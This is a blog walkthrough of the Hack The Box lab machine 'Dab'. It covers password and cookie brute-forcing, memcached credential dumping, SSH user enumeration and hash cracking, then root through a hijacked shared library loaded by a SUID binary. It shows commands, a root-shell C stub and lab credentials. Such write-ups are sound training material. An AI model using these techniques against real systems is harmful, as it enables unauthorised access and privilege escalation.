<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Dab - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Dab from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Dab">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/dab/">


  <meta property="og:description" content="My write-up / walkthrough for Dab from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Dab">
  <meta name="twitter:description" content="My write-up / walkthrough for Dab from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/dab/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-02-02T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/dab/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Dab">
    <meta itemprop="description" content="Hack The Box - DabQuick SummaryHey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in.NmapAs always we will start by running nmap note : I added the ip to /etc/hosts as dab.htbnmap -sV -sT -sC dab.htbWe find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx.Let’s take a look at the ftp server.FTPanonymous login succeeds , then by listing the files we only see one file dab.jpgWe will download it get dab.jpg then we will take a look at that image.Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpgAnd for password I left it blank and it was accepted !Next step is to extract that txt file steghide extract -sf dab.jpgCool let’s cat it.And , Nope…So we just got trolled , next thing is to look at httpCheck out my steganography listHTTPOn port 80 there’s a login page.And port 8080 tells us : Access denied: password authentication cookie not setBruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuffAnd port 8080 had nothing.HTTP port 80Let’s enumerate the first port and see what we can get.The most common credentials admin:admin didn’t work and we get Error: Login failedIf we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and passwordAt this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version.Fuzzing with ZAPFirst thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from SeclistsLet’s start zap and intercept the request again.Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value.Add –&gt; Add then we paste the wordlist contents.all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password.And we get it in , but …Nothing interesting , was this port important ? correct me if i’m wrong.HTTP port 8080Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie.Let’s add a cookie and name it password , value can be anything we’re just testingWe got another message : Access denied: password authentication cookie incorrectSo we just need to get the right value of the cookie and we will get in.We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZThen we will terminate it immediately and look how can we filter the outputAll the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 charswfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324secret gave us a response of 540 , let’s try in burpnext step is to add the cookie , you can use any cookie editor. after that we get this page.Finally we got somethingmemcachedThe very first thing we see is : “Status of cache engine: Online”cache engine ? after some googling we will find a software called memcachedhttps://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf  memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1  By default, memcached uses the following settings:•  Memory allocation of 64MB•  Listens for connections on all network interfaces, using port 11211•  Supports a maximum of 1024 simultaneous connections -page 5So we know that memcached runs on port 11211 , let’s try any port to testWe get an internal server errorNow let’s try port 11211We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right.Now we need to know what to put in “line to send”By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet)Full output :STAT 1:chunk_size 96STAT 1:chunks_per_page 10922STAT 1:total_pages 1STAT 1:total_chunks 10922STAT 1:used_chunks 0STAT 1:free_chunks 10922STAT 1:free_chunks_end 0STAT 1:mem_requested 0STAT 1:get_hits 0STAT 1:cmd_set 0STAT 1:delete_hits 0STAT 1:incr_hits 0STAT 1:decr_hits 0STAT 1:cas_hits 0STAT 1:cas_badval 0STAT 1:touch_hits 0STAT 16:chunk_size 2904STAT 16:chunks_per_page 361STAT 16:total_pages 1STAT 16:total_chunks 361STAT 16:used_chunks 1STAT 16:free_chunks 360STAT 16:free_chunks_end 0STAT 16:mem_requested 2880STAT 16:get_hits 0STAT 16:cmd_set 2STAT 16:delete_hits 0STAT 16:incr_hits 0STAT 16:decr_hits 0STAT 16:cas_hits 0STAT 16:cas_badval 0STAT 16:touch_hits 0STAT 26:chunk_size 27120STAT 26:chunks_per_page 38STAT 26:total_pages 1STAT 26:total_chunks 38STAT 26:used_chunks 1STAT 26:free_chunks 37STAT 26:free_chunks_end 0STAT 26:mem_requested 24699STAT 26:get_hits 440STAT 26:cmd_set 7STAT 26:delete_hits 0STAT 26:incr_hits 0STAT 26:decr_hits 0STAT 26:cas_hits 0STAT 26:cas_badval 0STAT 26:touch_hits 0STAT active_slabs 3STAT total_malloced 3127416ENDBy looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 00 for no result limitWe get ITEM usersSo we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes.SSH enumeration and getting userLet’s copy that output and save it on our box. I saved it in a file and called it users.txtAnd it’s a lot of unorganized data , 3 or more pages like this.we will use a python module called json.tool to get a more clear outputcat users.txt | python -m json.tool &gt; users2.txtAnd it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them.cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d '&quot;' -f 2 &gt; usernames.txtcat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d '&quot;' -f 2 &gt; hashes.txtTo bruteforce ssh we will use a metasploit module called ssh_enumusersmsfconsoleuse auxiliary/scanner/ssh/ssh_enumusers`set RHOSTS dab.htb`set USER_FILE usernames.txt`set THREADS 20`It will run for a while , then it will tell us that it found the user genevievenow we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txtAnd finally we have valid credentials genevieve:Princess1 , let’s sshFinally , we owned user !More enumerationWe have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder.It gets us a root shell then immediately dies after the first command. We got trolled again :Dfind / -perm -4000 to search for suid binaries and we see something unusual.A binary called myexec has suid permissions. Let’s see what’s that.It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password.Getting the passwordscp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our boxThen we will use radare2radare2 myexecaaapdf @ mainThe password is s3cur3l0g1n , let’s get back to the box and try it And we get:password is correct seclogin() calledTODO: Placeholder for now, function not implemented yetso what can we do now ?Hijacking dynamically linked shared object library and getting rootIf we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.soand we saw earlier when we executed the binary : seclogin() calledSo theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that.We will create a directory in /home/genevieve/ and call it .exploitThen we will write a small c program that spawns bash.#include &lt;stdio.h&gt;seclogin() {setgid(0);setuid(0);system(&quot;/bin/bash&quot;);}After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.cNow our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.soWe will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it.Then to activate that path we will execute this command ldconfigThis page helped a lot.Let’s do ldd again:The path changed and pointed to our fake library.Let’s own root../myexecAnd we owned root.That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - SecnotesNext Hack The Box write-up : Hack The Box - Ypuffy">
    <meta itemprop="datePublished" content="2019-02-02T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/dab/" class="u-url" itemprop="url">Hack The Box - Dab
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-02-02T07:00:00+02:00">February 2, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---dab">Hack The Box - Dab</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#ftp">FTP</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#http-port-80">HTTP port 80</a></li>
<li><a href="#fuzzing-with-zap">Fuzzing with ZAP</a></li>
<li><a href="#http-port-8080">HTTP port 8080</a></li>
<li><a href="#memcached">memcached</a></li>
<li><a href="#ssh-enumeration-and-getting-user">SSH enumeration and getting user</a></li>
<li><a href="#more-enumeration">More enumeration</a></li>
<li><a href="#getting-the-password">Getting the password</a></li>
<li><a href="#hijacking-dynamically-linked-shared-object-library-and-getting-root">Hijacking dynamically linked shared object library and getting root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---dab">Hack The Box - Dab</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in.<br>
<br><img src="/images/hackthebox/dab/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start by running nmap 
note : I added the ip to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as dab.htb
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC dab.htb</code>
<br><img src="/images/hackthebox/dab/1.png" alt="" class="align-center"><br><br>
We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx.<br>
Let’s take a look at the ftp server.<br></p>

<h2 id="ftp">FTP</h2>
<p>anonymous login succeeds , then by listing the files we only see one file <code class="language-plaintext highlighter-rouge">dab.jpg</code>
<br><img src="/images/hackthebox/dab/2.png" alt="" class="align-center"><br><br>
We will download it <code class="language-plaintext highlighter-rouge">get dab.jpg</code> then we will take a look at that image.<br>
<br><img src="/images/hackthebox/dab/dab.jpg" alt="">
Nothing really special , maybe steganography ? Let’s try steghide 
<code class="language-plaintext highlighter-rouge">steghide info dab.jpg</code>
<br><img src="/images/hackthebox/dab/3.png" alt="" class="align-center"><br><br>
And for password I left it blank and it was accepted !
Next step is to extract that txt file 
<code class="language-plaintext highlighter-rouge">steghide extract -sf dab.jpg</code>
<br><img src="/images/hackthebox/dab/4.png" alt="" class="align-center"><br><br>
Cool let’s <code class="language-plaintext highlighter-rouge">cat</code> it.<br>
<br><img src="/images/hackthebox/dab/5.png" alt="" class="align-center"><br><br>
And , Nope…<br>
So we just got trolled , next thing is to look at http
Check out my <a href="/lists/stego">steganography list</a></p>

<h2 id="http">HTTP</h2>
<p>On port 80 there’s a login page.<br>
<br><img src="/images/hackthebox/dab/6.png" alt="" class="align-center"><br><br>
And port 8080 tells us : <code class="language-plaintext highlighter-rouge">Access denied: password authentication cookie not set</code>
<br><img src="/images/hackthebox/dab/7.png" alt="" class="align-center"><br><br>
Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only <code class="language-plaintext highlighter-rouge">/login</code> and <code class="language-plaintext highlighter-rouge">/login</code>. Normal stuff
<br><img src="/images/hackthebox/dab/8.png" alt="" class="align-center"><br><br>
And port 8080 had nothing.<br>
<br><img src="/images/hackthebox/dab/9.png" alt="" class="align-center"><br><br></p>

<h2 id="http-port-80">HTTP port 80</h2>
<p>Let’s enumerate the first port and see what we can get.<br>
The most common credentials <code class="language-plaintext highlighter-rouge">admin:admin</code> didn’t work and we get <code class="language-plaintext highlighter-rouge">Error: Login failed</code>
<br><img src="/images/hackthebox/dab/10.png" alt="" class="align-center"><br><br>
If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>
<br><img src="/images/hackthebox/dab/11.png" alt="" class="align-center"><br><br>
At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version.<br></p>

<h2 id="fuzzing-with-zap">Fuzzing with ZAP</h2>
<p>First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt" target="_blank" rel="noopener noreferrer">darkweb2017-top10000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">Seclists</a>
Let’s start zap and intercept the request again.<br>
<br><img src="/images/hackthebox/dab/12.png" alt="" class="align-center"><br><br>
Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value.<br>
<br><img src="/images/hackthebox/dab/13.png" alt="" class="align-center"><br><br>
Add –&gt; Add then we paste the wordlist contents.<br>
<br><img src="/images/hackthebox/dab/14.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/15.png" alt="" class="align-center"><br><br>
all the responses will be <code class="language-plaintext highlighter-rouge">200</code> and 542 bytes , except one response <code class="language-plaintext highlighter-rouge">302</code> and 209 bytes , for the value <code class="language-plaintext highlighter-rouge">Password1</code> so that’s the password.<br>
<br><img src="/images/hackthebox/dab/16.png" alt="" class="align-center"><br><br>
And we get it in , but …<br>
<br><img src="/images/hackthebox/dab/17.png" alt="" class="align-center"><br><br>
Nothing interesting , was this port important ? correct me if i’m wrong.<br></p>

<h2 id="http-port-8080">HTTP port 8080</h2>
<p>Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie.<br>
<br><img src="/images/hackthebox/dab/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/19.png" alt="" class="align-center"><br><br>
Let’s add a cookie and name it password , value can be anything we’re just testing
<br><img src="/images/hackthebox/dab/20.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/21.png" alt="" class="align-center"><br><br>
We got another message : <code class="language-plaintext highlighter-rouge">Access denied: password authentication cookie incorrect</code>
So we just need to get the right value of the cookie and we will get in.<br>
We will use wfuzz to fuzz the cookie 
<code class="language-plaintext highlighter-rouge">wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ</code>
Then we will terminate it immediately and look how can we filter the output
<br><img src="/images/hackthebox/dab/22.png" alt="" class="align-center"><br><br>
All the responses has <code class="language-plaintext highlighter-rouge">324 chars</code> so we will add <code class="language-plaintext highlighter-rouge">--hh 324</code> and this will not show us any response with 324 chars
<br><code class="language-plaintext highlighter-rouge">wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324</code>
<br><img src="/images/hackthebox/dab/23.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">secret</code> gave us a response of 540 , let’s try in burp
<br><img src="/images/hackthebox/dab/24.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/25.png" alt="" class="align-center"><br><br>
next step is to add the cookie , you can use any cookie editor. after that we get this page.<br>
<br><img src="/images/hackthebox/dab/26.png" alt="" class="align-center"><br><br>
Finally we got something</p>

<h2 id="memcached">memcached</h2>
<p>The very first thing we see is : “Status of cache engine: Online”
cache engine ? after some googling we will find a software called memcached
<a href="https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf" target="_blank" rel="noopener noreferrer">https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf</a></p>

<blockquote>
  <p>memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects.<br>
 -page 1</p>
</blockquote>

<blockquote>
  <p>By default, memcached uses the following settings:
•  Memory allocation of 64MB
•  Listens for connections on all network interfaces, using port 11211
•  Supports a maximum of 1024 simultaneous connections
 -page 5</p>
</blockquote>

<p>So we know that memcached runs on port 11211 , let’s try any port to test
<br><img src="/images/hackthebox/dab/27.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/28.png" alt="" class="align-center"><br><br>
We get an internal server error
Now let’s try port 11211
<br><img src="/images/hackthebox/dab/29.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/30.png" alt="" class="align-center"><br><br>
We get <code class="language-plaintext highlighter-rouge">output : ERROR</code> because we didn’t send a valid command , but that’s a confirmation that the port is right.<br>
Now we need to know what to put in “line to send”
By looking at this <a href="https://lzone.de/cheat-sheet/memcached" target="_blank" rel="noopener noreferrer">cheat sheet</a> , the first command we see is <code class="language-plaintext highlighter-rouge">get</code> which reads a value , first time i did this box i guessed it , just typed <code class="language-plaintext highlighter-rouge">get users</code> and it worked but the right way to do it is to query the memory statistics with <code class="language-plaintext highlighter-rouge">stats slabs</code> (as mentioned in the cheat sheet)
<br><img src="/images/hackthebox/dab/31.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/32.png" alt="" class="align-center"><br><br>
Full output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 0
STAT 1:free_chunks 10922
STAT 1:free_chunks_end 0
STAT 1:mem_requested 0
STAT 1:get_hits 0
STAT 1:cmd_set 0
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT 16:chunk_size 2904
STAT 16:chunks_per_page 361
STAT 16:total_pages 1
STAT 16:total_chunks 361
STAT 16:used_chunks 1
STAT 16:free_chunks 360
STAT 16:free_chunks_end 0
STAT 16:mem_requested 2880
STAT 16:get_hits 0
STAT 16:cmd_set 2
STAT 16:delete_hits 0
STAT 16:incr_hits 0
STAT 16:decr_hits 0
STAT 16:cas_hits 0
STAT 16:cas_badval 0
STAT 16:touch_hits 0
STAT 26:chunk_size 27120
STAT 26:chunks_per_page 38
STAT 26:total_pages 1
STAT 26:total_chunks 38
STAT 26:used_chunks 1
STAT 26:free_chunks 37
STAT 26:free_chunks_end 0
STAT 26:mem_requested 24699
STAT 26:get_hits 440
STAT 26:cmd_set 7
STAT 26:delete_hits 0
STAT 26:incr_hits 0
STAT 26:decr_hits 0
STAT 26:cas_hits 0
STAT 26:cas_badval 0
STAT 26:touch_hits 0
STAT active_slabs 3
STAT total_malloced 3127416
END

</code></pre></div></div>
<p>By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab 
<code class="language-plaintext highlighter-rouge">stats cachedump 26 0</code><br>
0 for no result limit
<br><img src="/images/hackthebox/dab/33.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/34.png" alt="" class="align-center"><br><br>
We get ITEM users
So we do <code class="language-plaintext highlighter-rouge">get users</code> , however you can just guess it like I said. We get a huge json output of usernames and password hashes.<br>
<br><img src="/images/hackthebox/dab/35.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/dab/36.png" alt="" class="align-center"><br><br></p>

<h2 id="ssh-enumeration-and-getting-user">SSH enumeration and getting user</h2>
<p>Let’s copy that output and save it on our box. I saved it in a file and called it users.txt
<br><img src="/images/hackthebox/dab/37.png" alt="" class="align-center"><br><br>
And it’s a lot of unorganized data , 3 or more pages like this.<br>
we will use a python module called json.tool to get a more clear output
<br><code class="language-plaintext highlighter-rouge">cat users.txt | python -m json.tool &gt; users2.txt</code>
<br><img src="/images/hackthebox/dab/38.png" alt="" class="align-center"><br><br>
And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them.<br>
<code class="language-plaintext highlighter-rouge">cat users2.txt | cut -d ":" -f 1 | cut -d '"' -f 2 &gt; usernames.txt</code>
<br><code class="language-plaintext highlighter-rouge">cat users2.txt | cut -d ":" -f 2 | cut -d '"' -f 2 &gt; hashes.txt</code>
<br><img src="/images/hackthebox/dab/39.png" alt="" class="align-center"><br><br>
To bruteforce ssh we will use a metasploit module called <code class="language-plaintext highlighter-rouge">ssh_enumusers</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
use auxiliary/scanner/ssh/ssh_enumusers`
set RHOSTS dab.htb`
set USER_FILE usernames.txt`
set THREADS 20`
</code></pre></div></div>
<p><br><img src="/images/hackthebox/dab/40.png" alt="" class="align-center"><br><br>
It will run for a while , then it will tell us that it found the user <code class="language-plaintext highlighter-rouge">genevieve</code>
<br><img src="/images/hackthebox/dab/41.png" alt="" class="align-center"><br><br>
now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : 
<br><img src="/images/hackthebox/dab/42.png" alt="" class="align-center"><br><br>
Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in <code class="language-plaintext highlighter-rouge">users2.txt</code> then we will grep for the hash in <code class="language-plaintext highlighter-rouge">cracked-hashes.txt</code>
<br><img src="/images/hackthebox/dab/43.png" alt="" class="align-center"><br><br>
And finally we have valid credentials <code class="language-plaintext highlighter-rouge">genevieve:Princess1</code> , let’s ssh
<br><img src="/images/hackthebox/dab/44.png" alt="" class="align-center"><br><br>
Finally , we owned user !</p>

<h2 id="more-enumeration">More enumeration</h2>
<p>We have a password , let’s try <code class="language-plaintext highlighter-rouge">sudo -l</code> , and we see that we can run this binary as root <code class="language-plaintext highlighter-rouge">/usr/bin/try_harder</code> , and as the name said … we should really try harder.<br>
<br><img src="/images/hackthebox/dab/45.png" alt="" class="align-center"><br><br>
It gets us a root shell then immediately dies after the first command. We got trolled again :D
<code class="language-plaintext highlighter-rouge">find / -perm -4000</code> to search for suid binaries and we see something unusual.<br>
<br><img src="/images/hackthebox/dab/46.png" alt="" class="align-center"><br><br>
A binary called <code class="language-plaintext highlighter-rouge">myexec</code> has suid permissions. Let’s see what’s that.<br>
<br><img src="/images/hackthebox/dab/47.png" alt="" class="align-center"><br><br>
It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password.<br></p>

<h2 id="getting-the-password">Getting the password</h2>
<p><code class="language-plaintext highlighter-rouge">scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab</code> to download the file on our box
<br><img src="/images/hackthebox/dab/48.png" alt="" class="align-center"><br><br>
Then we will use radare2</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>radare2 myexec
aaa
pdf @ main
</code></pre></div></div>
<p><br><img src="/images/hackthebox/dab/49.png" alt="" class="align-center"><br><br>
The password is <code class="language-plaintext highlighter-rouge">s3cur3l0g1n</code> , let’s get back to the box and try it 
<br><img src="/images/hackthebox/dab/50.png" alt="" class="align-center"><br><br>
And we get:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password is correct 
seclogin() called
TODO: Placeholder for now, function not implemented yet
</code></pre></div></div>
<p>so what can we do now ?</p>

<h2 id="hijacking-dynamically-linked-shared-object-library-and-getting-root">Hijacking dynamically linked shared object library and getting root</h2>
<p>If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so
<br><img src="/images/hackthebox/dab/51.png" alt="" class="align-center"><br><br>
and we saw earlier when we executed the binary : <code class="language-plaintext highlighter-rouge">seclogin() called</code>
So theoretically , if we can replace <code class="language-plaintext highlighter-rouge">libseclogin.so</code> with another one and link to it , the binary will execute it as root. let’s test that.<br>
We will create a directory in <code class="language-plaintext highlighter-rouge">/home/genevieve/</code> and call it <code class="language-plaintext highlighter-rouge">.exploit</code>
Then we will write a small c program that spawns bash.<br></p>
